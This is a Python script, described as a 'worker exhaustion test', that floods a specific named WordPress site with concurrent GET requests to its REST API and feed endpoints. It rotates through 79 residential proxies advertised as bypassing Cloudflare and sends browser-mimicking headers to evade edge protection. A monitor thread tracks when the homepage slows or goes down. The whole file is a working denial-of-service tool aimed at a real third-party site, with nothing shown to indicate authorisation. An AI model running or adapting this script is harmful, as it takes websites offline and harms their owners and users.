#!/usr/bin/env python3
"""
get_burst.py — WordPress GET flood / worker exhaustion test.
Targets REST API GET endpoints (posts, media, comments, feed).
79 CF-bypassing residential proxies, IP auth.

Install: pip3 install requests
Run:     python3 get_burst.py
"""

import requests, threading, itertools, time, sys, urllib3, random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

BASE    = "https://metoo-shatkin.com"
CONC    = 50
TIMEOUT = 20

TARGETS = [
    BASE + "/wp-json/wp/v2/posts?per_page=100",
    BASE + "/wp-json/wp/v2/media?per_page=100",
    BASE + "/wp-json/wp/v2/comments?per_page=100",
    BASE + "/feed/",
    BASE + "/wp-json/wp/v2/posts?per_page=100&page=2",
    BASE + "/wp-json/wp/v2/posts?per_page=100&_embed=1",
]

HEADERS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":          "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "sec-ch-ua":       '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
    "sec-ch-ua-mobile":"?0",
    "sec-ch-ua-platform":'"Windows"',
    "sec-fetch-dest":  "empty",
    "sec-fetch-mode":  "cors",
    "sec-fetch-site":  "same-origin",
    "Referer":         BASE + "/",
}

# 79 CF-bypassing residential proxies — IP auth (tested 2026-07-22)
PROXIES = [
    "64.64.127.48:6001","45.150.23.220:6690","161.123.5.98:5147","191.96.130.89:5852",
    "199.180.9.155:6175","136.0.120.90:6108","206.206.124.108:6689","146.103.5.57:6637",
    "50.114.98.97:5581","206.206.71.115:5755","50.114.98.35:5519","185.216.107.236:5813",
    "173.0.10.198:6374","198.37.106.97:6556","142.147.128.45:6545","206.206.124.223:6804",
    "173.0.10.13:6189","23.27.236.196:6932","172.120.119.224:5884","199.180.10.74:6445",
    "45.115.195.234:6212","185.216.106.9:6086","142.147.128.208:6708","173.211.68.103:6385",
    "91.198.95.192:8493","206.206.124.17:6598","142.147.129.107:5716","206.206.71.90:5730",
    "206.206.73.18:6634","31.58.29.147:6113","154.29.232.166:6826","31.59.18.43:6624",
    "206.206.69.34:6298","64.64.110.240:6763","31.59.18.63:6644","142.147.131.132:6032",
    "185.216.105.248:6825","104.253.59.133:6556","154.29.233.60:5821","199.180.10.99:6470",
    "136.0.127.71:5780","23.27.236.31:6767","146.103.5.128:6708","185.216.105.221:6798",
    "64.64.110.165:6688","142.147.245.3:5694","50.114.28.169:5654","206.206.64.206:6167",
    "31.59.18.197:6778","161.123.5.182:5231","206.206.124.57:6638","50.114.8.220:7205",
    "206.206.118.129:6367","91.198.95.17:8318","38.154.204.122:8163","136.0.183.31:5405",
    "206.232.103.85:6242","142.147.242.71:6050","199.180.9.137:6157","206.206.118.23:6261",
    "50.114.82.146:7130","142.147.128.8:6508","23.27.209.248:6267","50.114.14.238:6723",
    "142.147.131.185:6085","23.27.210.161:6531","173.211.68.144:6426","185.216.106.14:6091",
    "173.244.41.131:6315","31.59.18.56:6637","206.206.69.21:6285","38.154.204.152:8193",
    "154.29.239.134:6173","206.206.64.21:5982","154.29.239.54:6093","154.29.239.214:6253",
    "142.147.132.100:6295","142.147.132.146:6341","142.147.245.11:5702","185.216.105.100:6677",
]

target_cycle = itertools.cycle(TARGETS)
proxy_cycle  = itertools.cycle([f"http://{p}" for p in PROXIES])
lock = threading.Lock()

def next_pair():
    with lock:
        return next(target_cycle), next(proxy_cycle)

def fire():
    url, p = next_pair()
    t0 = time.time()
    try:
        r = requests.get(url, headers=HEADERS,
                         proxies={"http": p, "https": p},
                         timeout=TIMEOUT)
        return r.status_code, time.time() - t0
    except:
        return 0, time.time() - t0

MONITOR_URL      = BASE + "/"
MONITOR_INTERVAL = 4

G="\033[0;32m";R="\033[0;31m";Y="\033[0;33m";C="\033[0;36m";W="\033[0m";B="\033[1m"

mon = {"ms": 0, "code": 0, "tag": "...", "color": W}
mon_lock = threading.Lock()

def monitor_loop():
    while True:
        t0m = time.time()
        try:
            r = requests.get(MONITOR_URL, timeout=12, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 Chrome/124"})
            ms  = (time.time() - t0m) * 1000
            code = r.status_code
            if code == 503:   color, tag = R, "⚠ DOWN"
            elif ms < 800:    color, tag = G, "FAST"
            elif ms < 2000:   color, tag = Y, "SLOW"
            else:             color, tag = R, "DEGRADED"
        except:
            ms = (time.time() - t0m) * 1000
            code, color, tag = 0, R, "TIMEOUT"
        with mon_lock:
            mon["ms"] = ms; mon["code"] = code
            mon["tag"] = tag; mon["color"] = color
        time.sleep(MONITOR_INTERVAL)

threading.Thread(target=monitor_loop, daemon=True).start()
time.sleep(1)

print(f"\n{B}{'═'*76}{W}")
print(f"  GET Flood — {CONC} concurrent | {len(PROXIES)} proxies | {len(TARGETS)} endpoints rotating")
print(f"  Targets: /wp-json/posts /wp-json/media /wp-json/comments /feed/")
print(f"  Monitor: {MONITOR_URL}")
print(f"  Ctrl+C to stop\n{B}{'═'*76}{W}")
print(f"  {'BURST':<6} {'TIME':<9} {'200':>4} {'403':>4} {'429':>4} {'503':>4} {'520':>4} {'ERR':>4} {'AVG':>7}  HOMEPAGE")
print(f"  {'─'*74}")

burst=0; total=0; total_503=0; total_200=0; collapses=[]; t0=time.time()
try:
    while True:
        burst += 1
        ts = datetime.now().strftime("%H:%M:%S")
        with ThreadPoolExecutor(max_workers=CONC) as ex:
            futs   = [ex.submit(fire) for _ in range(CONC)]
            codes  = []; times = []
            for f in as_completed(futs):
                c, t = f.result(); codes.append(c); times.append(t); total += 1

        c200 = codes.count(200); c403 = codes.count(403)
        c429 = codes.count(429); c503 = codes.count(503)
        c520 = codes.count(520); cerr = codes.count(0)
        avg  = sum(times) / len(times)
        total_503 += c503; total_200 += c200

        if c503 > 0 or c520 > 0:
            collapses.append(ts)
            st = f"{R}{B}⚠ SERVER DOWN{W}"
        elif avg > 8: st = f"{Y}HEAVY DEGRADED{W}"
        elif avg > 4: st = f"{Y}DEGRADED{W}"
        elif c200 > 0: st = f"{R}HITTING PHP-FPM{W}"
        else:          st = f"{G}BLOCKED AT EDGE{W}"

        with mon_lock:
            mms=mon["ms"]; mcode=mon["code"]; mtag=mon["tag"]; mcol=mon["color"]

        mon_str = f"{mcol}{B}{mms:>7.0f}ms{W} {mcol}{mtag}{W} (HTTP {mcode})"
        print(f"  {C}[{burst:>4}]{W} {ts} {c200:>4} {c403:>4} {c429:>4} "
              f"{R if c503 else W}{c503:>4}{W} {c520:>4} {cerr:>4} "
              f"{avg:>6.2f}s  {st}  │ {mon_str}")

except KeyboardInterrupt:
    elapsed = time.time() - t0
    print(f"\n  {'─'*74}")
    print(f"  Bursts:{burst}  Reqs:{total}  200s:{total_200}  503s:{total_503}  Runtime:{elapsed:.0f}s")
    if collapses:
        print(f"  {R}Collapse windows: {', '.join(collapses)}{W}")
    if total_200 > 0:
        print(f"  {R}!! {total_200} requests HIT PHP-FPM — GET flood is live vector{W}")
    else:
        print(f"  {G}All stopped at edge — GET endpoints protected{W}")
    print()
